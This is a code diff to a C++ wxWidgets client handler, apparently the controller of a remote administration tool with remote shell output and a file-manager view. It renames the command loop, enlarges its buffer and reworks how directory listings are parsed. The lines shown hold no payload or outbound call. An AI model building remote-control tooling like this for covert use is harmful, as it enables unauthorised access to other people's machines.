@@ -65,8 +65,8 @@ void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
     }
 }
 
-void Cliente_Handler::Spawn_Handler(){
-    int iBufferSize = 1024 * 100; //100 kb
+void Cliente_Handler::Command_Handler(){
+    int iBufferSize = 1024 * 1024; //1 MB
     std::unique_ptr<char[]> cBuffer = std::make_unique<char[]>(iBufferSize);
     DWORD error_code = 0;
     int iTempRecibido = 0;
@@ -180,35 +180,16 @@ void Cliente_Handler::Spawn_Handler(){
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
             vcDatos = strSplit(std::string(cBuffer.get()), CMD_DEL, 2);
             if (vcDatos.size() == 2) {
-                std::vector<std::string> vcFileEntry;
-                wxString strTama = "-";
-                if (vcDatos[1][1] == '>') {
-                    //Dir
-                    vcFileEntry = strSplit(vcDatos[1], '>', 4);
-                }
-                else if (vcDatos[1][1] == '<') {
-                    //file
-                    vcFileEntry = strSplit(vcDatos[1], '<', 4);
-                    if (vcFileEntry.size() == 4) {
-                        u64 bytes = StrToUint(vcFileEntry[2].c_str());
-                        char* cDEN = "BKMGTP";
-                        double factor = floor((vcFileEntry[2].size() - 1) / 3);
-                        char cBuf[20];
-                        snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
-                        strTama = cBuf;
-                    }
-                }
-                else {
-                    //unknown
-                    std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
+                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
+                //Comprobar que al movel el puntero no se pase del buffer
+                int iPos = vcDatos[0].size() + 1;
+                iPos = (iPos < iRecibido) ? iPos : 0;
+
+                char* cFilesBuffer = cBuffer.get() + iPos;
+                if (temp_list && cFilesBuffer) {
+                    temp_list->ListarDir(cFilesBuffer);
                 }
 
-                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
-                if (temp_list) {
-                    if (vcFileEntry.size() >= 4) {
-                        temp_list->ListarDir(vcFileEntry, strTama);
-                    }
-                }
             }
             continue;
         }
@@ -438,7 +419,7 @@ void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
 }
 
 void Cliente_Handler::Spawn_Thread() {
-    this->p_thHilo = std::thread(&Cliente_Handler::Spawn_Handler, this);
+    this->p_thHilo = std::thread(&Cliente_Handler::Command_Handler, this);
 }
 
 //funcion que crea el frame principal para interactuar con el cliente
